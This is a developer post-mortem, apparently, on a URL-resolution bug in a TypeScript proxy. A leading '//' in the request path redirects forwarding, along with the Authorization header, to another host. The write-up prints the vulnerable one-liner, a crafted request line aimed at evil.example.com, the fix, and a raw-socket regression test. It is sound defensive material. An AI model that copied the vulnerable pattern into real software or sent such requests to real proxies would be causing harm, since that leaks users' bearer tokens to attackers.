# `new URL(path, origin)` turns a leading `//` into a different host

## Symptom

A local HTTP proxy was written to forward every request to one configured
provider origin, so that it could never be used as an open proxy:

```ts
// intended: only scheme+host come from config, the path is passed through
const target = new URL(url.pathname + url.search, upstream.origin);
```

It looked correct — the path cannot contain a scheme, so the target host comes
from `upstream`. But a request line of the form:

```
POST //evil.example.com/x HTTP/1.1
```

produces `url.pathname === "//evil.example.com/x"`, and URL resolution reads a
leading `//` as *protocol-relative*, so the resolved URL is
`https://evil.example.com/x`.

For a proxy that forwards `Authorization` verbatim, this is a credential leak:
a prompt-injected tool call, or any harness bug that emits a doubled slash,
mails the bearer token to an attacker-chosen host.

## Cause

`new URL(input, base)` implements RFC 3986 reference resolution, not path
joining. `//authority/path` is a valid relative reference whose authority
replaces the base's. Concatenating a path onto an origin and then *resolving*
it re-opens the parsing rules that were supposed to be closed off.

Two things hid the bug during testing:

- `fetch()` and `curl` normalize `//` in a path at the client, so an ordinary
  test request never reproduces the shape. It only appears on the wire from a
  client that sends the request line unmodified.
- The failure is silent in the happy case: the request succeeds, just against
  the wrong host, so nothing looks broken from the caller's side.

## Fix

Assign the components instead of resolving a reference. `pathname` assignment
does not re-parse the string, so a leading `//` stays a path:

```ts
const target = new URL(upstream.origin);
target.pathname = url.pathname;
target.search = url.search;
// https://host.tld//evil.example.com/x  — still the configured host
```

Regression test it with a raw socket, because the normal HTTP clients cannot
send the input that matters:

```ts
Bun.connect({ hostname: "127.0.0.1", port, socket: { open(s) {
  s.write("POST //evil.example.com/x HTTP/1.1\r\nHost: 127.0.0.1\r\n...");
}}});
// assert the mock upstream saw pathname "/evil.example.com/x"
// and that its Host header was not "evil.example.com"
```

Verify the test actually catches it by reintroducing the one-liner and watching
it fail: with the bug, the proxy returns `502` because it tried to dial
`evil.example.com`.

Same trap applies to any component that concatenates a caller-supplied path
onto a base URL — reverse proxies, webhook forwarders, fetchers in MCP servers.
Prefer assigning `pathname`/`search`, or validate that the final
`target.origin === expectedOrigin` before sending credentials.
